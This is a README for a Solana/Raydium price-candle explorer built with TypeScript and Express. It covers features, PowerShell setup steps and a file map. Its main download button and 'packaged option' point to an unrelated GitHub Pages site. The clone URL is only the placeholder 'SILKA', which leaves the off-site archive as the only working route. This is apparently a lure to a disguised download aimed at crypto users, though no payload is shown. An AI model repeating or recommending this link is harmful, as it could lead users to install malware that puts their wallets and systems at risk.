# Raydium Price Tracker - Solana OHLC Market Explorer

Raydium Price Tracker is a compact TypeScript application for exploring Raydium price activity through Solana OHLC candles, market-level history, token metadata, and individual trades. It combines a browser interface with an Express proxy so a Raydium token or pool can be examined without placing API credentials in frontend code. The tracker supports vetted token candles, candles rebuilt from trades, and candles returned for one market address.

[![GET RAYDIUM PRICE TRACKER](https://img.shields.io/badge/GET%20RAYDIUM%20PRICE%20TRACKER-7C3AED?style=for-the-badge&logo=solana&logoColor=white)](https://remix-song.github.io/remix-song-studio/remix-song)

![Raydium Price Tracker](logo.png)

## What The Tracker Provides

- View Raydium price candles at resolutions from one minute through one year.
- Switch between full token OHLC, reconstructed trade candles, and a selected Raydium market or pool.
- Choose a time range, page range, sort order, and result limit before fetching data.
- Inspect token stats and metadata beside the active Raydium price chart.
- Compare programs, markets, quote mints, trade direction, volume, transaction IDs, and fee payers.
- Remove close-to-open gaps or filter extreme wicks with a configurable lookback and deviation threshold.
- Rebuild candles from paginated Solana trades while selecting the quote mint used by the chart.
- Export the current page or a paginated Raydium price dataset as CSV.
- Reuse local symbol, holder, and labeled-program caches for quicker repeated lookups.

The browser keeps remote and local filtering separate. Remote filters request a new dataset, while local controls refine loaded trades without another request. This makes it practical to compare a broad Raydium token history with one Raydium DEX market, identify which programs generated the activity, and review how quote-token selection changes the displayed series.

![Solana OHLC Candlestick Chart](screenshots/solana-ohlc-api-endpoint-candlestick-charts.png)

## Get The Build

The download button above is the packaged option. Extract the archive, open its directory, copy `.env.example` to `.env`, add `VYBE_API_KEY`, and start the application with `npm start`.

For a source setup, use PowerShell:

```powershell
git clone SILKA raydium-price-tracker
Set-Location raydium-price-tracker
npm install
Copy-Item .env.example .env
notepad .env
npm start
```

Node.js 20 or newer is required. The default server port is `3000`; set `PORT` in `.env` when another port is needed. The startup task builds the browser bundle through `build:frontend` and then runs `src/server.ts`. Development and validation commands are also available:

```powershell
npm run typecheck
npm run build
npm run build:frontend
npm run dev
```

## Using Raydium Price Tracker

Open `http://localhost:3000` and enter the mint for the Raydium token being examined. Select a candle source and resolution, define optional start and end times, then choose **Fetch Candles**. The full source returns token OHLC across vetted markets. The trades source loads Solana trade records and rebuilds Raydium price candles in the browser. The market source accepts a specific Raydium pool address and returns market-level candles.

When rebuilding from trades, select the chart quote and number of pages first. Enable **Authority = fee payer** to isolate matching signers, use **No gaps** to carry the previous close into the next open, and tune **Filter Wicks** with its lookback and deviation controls. Per-quote filters can limit trade sizes or suppress noisy quote assets. The summary panels then show leading programs, pools, quote mints, counts, and the covered time range.

Use **Export Current Page CSV** for the visible result set or **Export Paginated CSV** for a wider range. The exported records can support chart review, Raydium DEX comparisons, and local backtesting workflows.

## Data Flow And Project Map

The Express server loads the API key, serves the static interface, and forwards requests through a shared HTTP client with a 60-second timeout and retry handling. The client exposes token details, trades, token candles, market candles, and labeled program accounts. Browser rendering and filtering remain separate from credentials and upstream request logic.

| Area | Local file |
| --- | --- |
| Server and proxy routes | [`src/server.ts`](src/server.ts) |
| API client and retries | [`src/api/client.ts`](src/api/client.ts) |
| Token and market candles | [`src/api/candles.ts`](src/api/candles.ts), [`src/api/market-candles.ts`](src/api/market-candles.ts) |
| Trade retrieval | [`src/api/trades.ts`](src/api/trades.ts) |
| Browser chart and filters | [`src/frontend/app.ts`](src/frontend/app.ts) |
| Shared response types | [`src/types/api.ts`](src/types/api.ts) |

## Focus Terms

raydium price, raydium token, raydium dex, raydium market, raydium pool, solana ohlc, solana trades, token metadata, price candles, trade candles, market address, quote mint

## Notes And License

Keep `VYBE_API_KEY` in the server-side `.env` file. Cached symbols and program labels are stored under `data`, while generated frontend JavaScript is written to `public`. Run `npm run typecheck` after changing routes, API response types, candle transforms, or chart controls. The project uses the MIT license and follows the existing TypeScript, Express, and browser-module layout.
